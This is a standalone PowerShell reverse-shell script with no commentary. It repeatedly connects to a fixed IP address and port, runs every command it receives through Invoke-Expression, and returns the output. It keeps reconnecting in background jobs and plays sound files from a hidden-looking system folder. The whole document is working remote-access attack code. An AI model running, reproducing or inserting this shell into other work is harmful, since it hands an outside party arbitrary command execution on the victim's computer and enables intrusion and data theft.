$ip = '192.168.146.121'
$port = 8080

# Sound file path for connection established
$soundFilePathConnected = "C:\.SystemFiles\2.wav"

# Sound file path for connection disconnected
$soundFilePathDisconnected = "C:\.SystemFiles\1.wav"

while ($true) {
    # Create a new job each time to ensure continuous execution
    $jobScript = {
        $connectionEstablished = $false

        while ($true) {
            $tcpClient = New-Object System.Net.Sockets.TcpClient

            try {
                $tcpClient.Connect($using:ip, $using:port)
                $stream = $tcpClient.GetStream()
                $writer = [System.IO.StreamWriter]::new($stream)
                $reader = [System.IO.StreamReader]::new($stream)

                if (-not $connectionEstablished) {
                    # Play sound when connection is established
                    $soundPlayerConnected = New-Object System.Media.SoundPlayer
                    $soundPlayerConnected.SoundLocation = $using:soundFilePathConnected
                    $soundPlayerConnected.Play()

                    $connectionEstablished = $true
                }

                while ($true) {
                    $command = $reader.ReadLine()
                    if ($command -eq 'exit') {
                        break
                    }

                    $output = Invoke-Expression $command | Out-String
                    $writer.WriteLine($output)
                    $writer.Flush()
                }
            }
            catch {
                if ($connectionEstablished) {
                    # Play sound when connection is disconnected
                    $soundPlayerDisconnected = New-Object System.Media.SoundPlayer
                    $soundPlayerDisconnected.SoundLocation = $using:soundFilePathDisconnected
                    $soundPlayerDisconnected.Play()
                }

                Write-Host "Failed to establish a connection to $using:ip on port $using:port. Reconnecting..."
                Start-Sleep -Seconds 5
                $connectionEstablished = $false
            }
            finally {
                $tcpClient.Close()
            }
        }
    }

    # Start the script as a background job
    $job = Start-Job -ScriptBlock $jobScript

    # Wait for the job to complete before starting a new one
    Wait-Job $job | Out-Null

    # Remove the completed job
    Remove-Job $job | Out-Null
}
